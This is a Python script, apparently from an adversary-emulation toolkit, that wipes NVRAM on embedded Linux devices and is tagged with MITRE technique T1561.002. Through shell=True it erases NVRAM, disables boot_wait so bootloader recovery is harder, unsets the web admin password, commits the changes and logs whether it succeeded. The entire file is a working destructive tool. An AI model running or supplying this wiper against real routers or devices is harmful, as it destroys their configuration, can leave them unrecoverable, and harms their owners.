#!/usr/bin/env python3

import os, subprocess, json, argparse
from datetime import datetime

LOG_FILE = "results/nvram_wiper_log.json"
MITRE_TTP = "T1561.002"

def log(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def wipe_nvram():
    cmds = [
        "nvram erase",
        "nvram set boot_wait=off",
        "nvram unset http_passwd",
        "nvram commit"
    ]
    try:
        for cmd in cmds:
            subprocess.run(cmd, shell=True, check=True)
        return True
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(description="NVRAM Wiper for embedded Linux")
    args = parser.parse_args()
    success = wipe_nvram()
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "action": "nvram_wipe",
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
